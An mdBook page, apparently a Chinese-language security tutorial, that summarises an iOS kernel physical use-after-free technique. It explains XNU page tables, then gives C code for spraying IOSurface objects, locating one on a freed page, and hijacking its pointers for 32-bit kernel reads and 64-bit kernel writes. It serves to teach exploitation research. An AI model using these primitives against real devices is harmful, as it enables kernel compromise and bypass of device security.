<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>iOS Exploiting</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../favicon.svg">
        <link rel="shortcut icon" href="../favicon.png">
        <link rel="stylesheet" href="../css/variables.css">
        <link rel="stylesheet" href="../css/general.css">
        <link rel="stylesheet" href="../css/chrome.css">
        <link rel="stylesheet" href="../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../highlight.css">
        <link rel="stylesheet" href="../tomorrow-night.css">
        <link rel="stylesheet" href="../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="ios-exploiting"><a class="header" href="#ios-exploiting">iOS Exploiting</a></h1>
<h2 id="physical-use-after-free"><a class="header" href="#physical-use-after-free">Physical use-after-free</a></h2>
<p>这是来自<a href="https://alfiecg.uk/2024/09/24/Kernel-exploit.html">https://alfiecg.uk/2024/09/24/Kernel-exploit.html</a>的帖子摘要，此外，关于使用此技术的漏洞的更多信息可以在<a href="https://github.com/felix-pb/kfd">https://github.com/felix-pb/kfd</a>中找到。</p>
<h3 id="memory-management-in-xnu"><a class="header" href="#memory-management-in-xnu">Memory management in XNU <a href="#memory-management-in-xnu" id="memory-management-in-xnu"></a></a></h3>
<p>iOS上用户进程的<strong>虚拟内存地址空间</strong>范围从<strong>0x0到0x8000000000</strong>。然而，这些地址并不直接映射到物理内存。相反，<strong>内核</strong>使用<strong>页表</strong>将虚拟地址转换为实际的<strong>物理地址</strong>。</p>
<h4 id="levels-of-page-tables-in-ios"><a class="header" href="#levels-of-page-tables-in-ios">Levels of Page Tables in iOS</a></h4>
<p>页表分为三个层次进行分层组织：</p>
<ol>
<li><strong>L1 Page Table (Level 1)</strong>:</li>
</ol>
<ul>
<li>这里的每个条目表示一个大范围的虚拟内存。</li>
<li>它覆盖<strong>0x1000000000字节</strong>（或<strong>256 GB</strong>）的虚拟内存。</li>
</ul>
<ol start="2">
<li><strong>L2 Page Table (Level 2)</strong>:</li>
</ol>
<ul>
<li>这里的一个条目表示一个较小的虚拟内存区域，具体为<strong>0x2000000字节</strong>（32 MB）。</li>
<li>如果L1条目无法映射整个区域，它可能指向一个L2表。</li>
</ul>
<ol start="3">
<li><strong>L3 Page Table (Level 3)</strong>:</li>
</ol>
<ul>
<li>这是最细的级别，每个条目映射一个单独的<strong>4 KB</strong>内存页。</li>
<li>如果需要更细粒度的控制，L2条目可以指向L3表。</li>
</ul>
<h4 id="mapping-virtual-to-physical-memory"><a class="header" href="#mapping-virtual-to-physical-memory">Mapping Virtual to Physical Memory</a></h4>
<ul>
<li><strong>Direct Mapping (Block Mapping)</strong>:</li>
<li>页表中的某些条目直接<strong>映射一系列虚拟地址</strong>到一系列连续的物理地址（就像快捷方式）。</li>
<li><strong>Pointer to Child Page Table</strong>:</li>
<li>如果需要更细粒度的控制，一个级别中的条目（例如，L1）可以指向下一个级别的<strong>子页表</strong>（例如，L2）。</li>
</ul>
<h4 id="example-mapping-a-virtual-address"><a class="header" href="#example-mapping-a-virtual-address">Example: Mapping a Virtual Address</a></h4>
<p>假设你尝试访问虚拟地址<strong>0x1000000000</strong>：</p>
<ol>
<li><strong>L1 Table</strong>:</li>
</ol>
<ul>
<li>内核检查与此虚拟地址对应的L1页表条目。如果它有一个<strong>指向L2页表的指针</strong>，则转到该L2表。</li>
</ul>
<ol start="2">
<li><strong>L2 Table</strong>:</li>
</ol>
<ul>
<li>内核检查L2页表以获取更详细的映射。如果此条目指向<strong>L3页表</strong>，则继续到那里。</li>
</ul>
<ol start="3">
<li><strong>L3 Table</strong>:</li>
</ol>
<ul>
<li>内核查找最终的L3条目，该条目指向实际内存页的<strong>物理地址</strong>。</li>
</ul>
<h4 id="example-of-address-mapping"><a class="header" href="#example-of-address-mapping">Example of Address Mapping</a></h4>
<p>如果你将物理地址<strong>0x800004000</strong>写入L2表的第一个索引，则：</p>
<ul>
<li>从<strong>0x1000000000</strong>到<strong>0x1002000000</strong>的虚拟地址映射到从<strong>0x800004000</strong>到<strong>0x802004000</strong>的物理地址。</li>
<li>这是L2级别的<strong>块映射</strong>。</li>
</ul>
<p>或者，如果L2条目指向L3表：</p>
<ul>
<li>虚拟地址范围<strong>0x1000000000 -&gt; 0x1002000000</strong>中的每个4 KB页面将由L3表中的单独条目映射。</li>
</ul>
<h3 id="physical-use-after-free-1"><a class="header" href="#physical-use-after-free-1">Physical use-after-free</a></h3>
<p><strong>物理使用后释放</strong>（UAF）发生在：</p>
<ol>
<li>一个进程<strong>分配</strong>了一些内存作为<strong>可读和可写</strong>。</li>
<li><strong>页表</strong>被更新以将此内存映射到进程可以访问的特定物理地址。</li>
<li>该进程<strong>释放</strong>（释放）内存。</li>
<li>然而，由于一个<strong>错误</strong>，内核<strong>忘记从页表中删除映射</strong>，尽管它将相应的物理内存标记为已释放。</li>
<li>内核可以<strong>重新分配这块“释放”的物理内存</strong>用于其他目的，例如<strong>内核数据</strong>。</li>
<li>由于映射未被删除，进程仍然可以<strong>读写</strong>这块物理内存。</li>
</ol>
<p>这意味着进程可以访问<strong>内核内存的页面</strong>，这些页面可能包含敏感数据或结构，可能允许攻击者<strong>操纵内核内存</strong>。</p>
<h3 id="exploitation-strategy-heap-spray"><a class="header" href="#exploitation-strategy-heap-spray">Exploitation Strategy: Heap Spray</a></h3>
<p>由于攻击者无法控制哪些特定的内核页面将被分配给释放的内存，他们使用一种称为<strong>堆喷射</strong>的技术：</p>
<ol>
<li>攻击者在内核内存中<strong>创建大量IOSurface对象</strong>。</li>
<li>每个IOSurface对象在其字段中包含一个<strong>魔法值</strong>，使其易于识别。</li>
<li>他们<strong>扫描释放的页面</strong>，查看这些IOSurface对象是否落在释放的页面上。</li>
<li>当他们在释放的页面上找到一个IOSurface对象时，他们可以使用它来<strong>读写内核内存</strong>。</li>
</ol>
<p>有关此的更多信息，请参见<a href="https://github.com/felix-pb/kfd/tree/main/writeups">https://github.com/felix-pb/kfd/tree/main/writeups</a>。</p>
<h3 id="step-by-step-heap-spray-process"><a class="header" href="#step-by-step-heap-spray-process">Step-by-Step Heap Spray Process</a></h3>
<ol>
<li><strong>Spray IOSurface Objects</strong>: 攻击者创建许多带有特殊标识符（“魔法值”）的IOSurface对象。</li>
<li><strong>Scan Freed Pages</strong>: 他们检查是否有任何对象已分配在释放的页面上。</li>
<li><strong>Read/Write Kernel Memory</strong>: 通过操纵IOSurface对象中的字段，他们获得在内核内存中执行<strong>任意读写</strong>的能力。这使他们能够：</li>
</ol>
<ul>
<li>使用一个字段<strong>读取内核内存中的任何32位值</strong>。</li>
<li>使用另一个字段<strong>写入64位值</strong>，实现稳定的<strong>内核读/写原语</strong>。</li>
</ul>
<p>生成带有魔法值IOSURFACE_MAGIC的IOSurface对象以便后续搜索：</p>
<pre><code class="language-c">void spray_iosurface(io_connect_t client, int nSurfaces, io_connect_t **clients, int *nClients) {
if (*nClients &gt;= 0x4000) return;
for (int i = 0; i &lt; nSurfaces; i++) {
fast_create_args_t args;
lock_result_t result;

size_t size = IOSurfaceLockResultSize;
args.address = 0;
args.alloc_size = *nClients + 1;
args.pixel_format = IOSURFACE_MAGIC;

IOConnectCallMethod(client, 6, 0, 0, &amp;args, 0x20, 0, 0, &amp;result, &amp;size);
io_connect_t id = result.surface_id;

(*clients)[*nClients] = id;
*nClients = (*nClients) += 1;
}
}
</code></pre>
<p>在一个已释放的物理页面中搜索 <strong><code>IOSurface</code></strong> 对象：</p>
<pre><code class="language-c">int iosurface_krw(io_connect_t client, uint64_t *puafPages, int nPages, uint64_t *self_task, uint64_t *puafPage) {
io_connect_t *surfaceIDs = malloc(sizeof(io_connect_t) * 0x4000);
int nSurfaceIDs = 0;

for (int i = 0; i &lt; 0x400; i++) {
spray_iosurface(client, 10, &amp;surfaceIDs, &amp;nSurfaceIDs);

for (int j = 0; j &lt; nPages; j++) {
uint64_t start = puafPages[j];
uint64_t stop = start + (pages(1) / 16);

for (uint64_t k = start; k &lt; stop; k += 8) {
if (iosurface_get_pixel_format(k) == IOSURFACE_MAGIC) {
info.object = k;
info.surface = surfaceIDs[iosurface_get_alloc_size(k) - 1];
if (self_task) *self_task = iosurface_get_receiver(k);
goto sprayDone;
}
}
}
}

sprayDone:
for (int i = 0; i &lt; nSurfaceIDs; i++) {
if (surfaceIDs[i] == info.surface) continue;
iosurface_release(client, surfaceIDs[i]);
}
free(surfaceIDs);

return 0;
}
</code></pre>
<h3 id="achieving-kernel-readwrite-with-iosurface"><a class="header" href="#achieving-kernel-readwrite-with-iosurface">Achieving Kernel Read/Write with IOSurface</a></h3>
<p>在获得对内核内存中一个 IOSurface 对象的控制后（映射到一个可从用户空间访问的已释放物理页面），我们可以将其用于 <strong>任意内核读写操作</strong>。</p>
<p><strong>IOSurface 中的关键字段</strong></p>
<p>IOSurface 对象有两个关键字段：</p>
<ol>
<li><strong>使用计数指针</strong>：允许 <strong>32 位读取</strong>。</li>
<li><strong>索引时间戳指针</strong>：允许 <strong>64 位写入</strong>。</li>
</ol>
<p>通过覆盖这些指针，我们将其重定向到内核内存中的任意地址，从而启用读/写功能。</p>
<h4 id="32-位内核读取"><a class="header" href="#32-位内核读取">32 位内核读取</a></h4>
<p>要执行读取：</p>
<ol>
<li>将 <strong>使用计数指针</strong> 覆盖为指向目标地址减去 0x14 字节偏移量。</li>
<li>使用 <code>get_use_count</code> 方法读取该地址的值。</li>
</ol>
<pre><code class="language-c">uint32_t get_use_count(io_connect_t client, uint32_t surfaceID) {
uint64_t args[1] = {surfaceID};
uint32_t size = 1;
uint64_t out = 0;
IOConnectCallMethod(client, 16, args, 1, 0, 0, &amp;out, &amp;size, 0, 0);
return (uint32_t)out;
}

uint32_t iosurface_kread32(uint64_t addr) {
uint64_t orig = iosurface_get_use_count_pointer(info.object);
iosurface_set_use_count_pointer(info.object, addr - 0x14); // Offset by 0x14
uint32_t value = get_use_count(info.client, info.surface);
iosurface_set_use_count_pointer(info.object, orig);
return value;
}
</code></pre>
<h4 id="64位内核写入"><a class="header" href="#64位内核写入">64位内核写入</a></h4>
<p>要执行写入：</p>
<ol>
<li>将<strong>索引时间戳指针</strong>覆盖到目标地址。</li>
<li>使用<code>set_indexed_timestamp</code>方法写入64位值。</li>
</ol>
<pre><code class="language-c">void set_indexed_timestamp(io_connect_t client, uint32_t surfaceID, uint64_t value) {
uint64_t args[3] = {surfaceID, 0, value};
IOConnectCallMethod(client, 33, args, 3, 0, 0, 0, 0, 0, 0);
}

void iosurface_kwrite64(uint64_t addr, uint64_t value) {
uint64_t orig = iosurface_get_indexed_timestamp_pointer(info.object);
iosurface_set_indexed_timestamp_pointer(info.object, addr);
set_indexed_timestamp(info.client, info.surface, value);
iosurface_set_indexed_timestamp_pointer(info.object, orig);
}
</code></pre>
<h4 id="exploit-flow-recap"><a class="header" href="#exploit-flow-recap">Exploit Flow Recap</a></h4>
<ol>
<li><strong>触发物理使用后释放</strong>: 可重用的空闲页面。</li>
<li><strong>喷射IOSurface对象</strong>: 在内核内存中分配许多具有唯一“魔法值”的IOSurface对象。</li>
<li><strong>识别可访问的IOSurface</strong>: 找到一个在你控制的已释放页面上的IOSurface。</li>
<li><strong>滥用使用后释放</strong>: 修改IOSurface对象中的指针，以通过IOSurface方法启用任意<strong>内核读/写</strong>。</li>
</ol>
<p>通过这些原语，漏洞提供了对内核内存的受控<strong>32位读取</strong>和<strong>64位写入</strong>。进一步的越狱步骤可能涉及更稳定的读/写原语，这可能需要绕过额外的保护（例如，在较新的arm64e设备上的PPL）。</p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../binary-exploitation/windows-exploiting-basic-guide-oscp-lvl.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../reversing/reversing-tools-basic-methods/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../binary-exploitation/windows-exploiting-basic-guide-oscp-lvl.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../reversing/reversing-tools-basic-methods/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
